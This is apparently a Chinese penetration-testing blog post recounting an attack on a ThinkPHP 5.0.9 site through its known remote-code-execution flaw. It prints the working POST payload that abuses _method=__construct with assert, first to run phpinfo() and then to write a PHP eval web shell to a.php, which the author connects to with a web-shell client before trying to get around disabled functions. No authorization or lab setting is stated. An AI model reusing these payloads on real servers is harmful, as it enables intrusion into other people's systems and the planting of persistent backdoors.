**信息收集**

通过信息收集发现是个tp v5.0.9，此版本存在tp-rce漏洞。  

![](../Images/aa4a371a071860281e37258951fbdff4.png)

直接通过payload进行测试，  

```
Post：\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=phpinfo()

```

查找payload，直接打：

Post：\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=phpinfo()

![](../Images/c2e1e1ea0faec8161e0d151bfea2263f.png)

发现是php 5.4.45版本的，  

直接尝试getshell：

![](../Images/92ac25a643d2fc6836c19151a850cb78.png)

  

发现system被禁用，尝试其他系统命令的也一样。

![](../Images/7f71e70611839fae779f3fc3a64858db.png)

  

查看phpinfo中desable\_functions禁用了那些函数。  

![](../Images/6f0d8dbf63d437378d4c20f33448e1a2.png)

  

想办法怎么绕过进行写马（此处卡了我半天）

最后通过一位渗透小伙伴，想出下面的可以利用file\_put\_contents直接写shell，

想了半天，忘了用其他函数进行直接写马就可以了，并不需要非得利用system命令进行写马，还是底层知识薄弱啊。

再次感谢小伙伴！  

![](../Images/5e11adb65a9f065755a0c48b89d9f798.png)

**getshell**

构造payload：  

```
\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=file\_put\_contents('a.php','<?php eval($\_POST\[a\])?>')

```

  

![](../Images/bd04e375ea133c38408f61d85f733e93.png)

  

写入成功，利用菜刀连接。  

![](../Images/9069cca6e54393e2def0f2562c86ee53.png)

成功连接。

  
查看权限：  

![](../Images/ce707f302e9c22b027e9f95d9a97edd0.png)

发现启动了远程安全模式。

想要绕过，发现很多函数被禁用，占未成功。
